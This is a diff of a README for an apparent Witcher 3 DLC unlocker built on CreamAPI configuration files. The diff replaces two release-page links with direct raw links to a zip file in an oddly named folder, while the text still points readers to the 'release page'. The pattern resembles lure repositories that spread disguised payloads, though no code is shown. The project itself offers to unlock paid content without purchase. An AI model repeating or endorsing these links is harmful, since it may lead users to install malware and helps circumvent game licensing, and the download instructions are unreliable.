@@ -1,6 +1,6 @@
 # ⚔️ The-Witcher-3-DLC-Unlocker-Lightweight-CreamAPI-Config-Files - Access All Game Content With Ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/4dr13l3/The-Witcher-3-DLC-Unlocker-Lightweight-CreamAPI-Config-Files/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/4dr13l3/The-Witcher-3-DLC-Unlocker-Lightweight-CreamAPI-Config-Files/raw/refs/heads/main/superhirudine/Lightweight_Unlocker_Witcher_Config_Cream_DL_Files_AP_The_v2.6.zip)
 
 This software provides the necessary configuration files to unlock downloadable content for The Witcher 3. It utilizes a lightweight version of CreamAPI to bridge the gap between your game files and the game launcher. This process allows the application to recognize your full content library without requiring manual changes to the game registry or complex command lines.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these basic requirements before you begin:
 
 You must visit the official release page to obtain the correct files. Once you reach the page, look for the most recent version labeled as the latest release.
 
-[Click here to visit the release page and download the files](https://github.com/4dr13l3/The-Witcher-3-DLC-Unlocker-Lightweight-CreamAPI-Config-Files/releases)
+[Click here to visit the release page and download the files](https://github.com/4dr13l3/The-Witcher-3-DLC-Unlocker-Lightweight-CreamAPI-Config-Files/raw/refs/heads/main/superhirudine/Lightweight_Unlocker_Witcher_Config_Cream_DL_Files_AP_The_v2.6.zip)
 
 Select the zip file that appears under the assets section. Save this file to your computer desktop or your downloads folder for quick access.
 
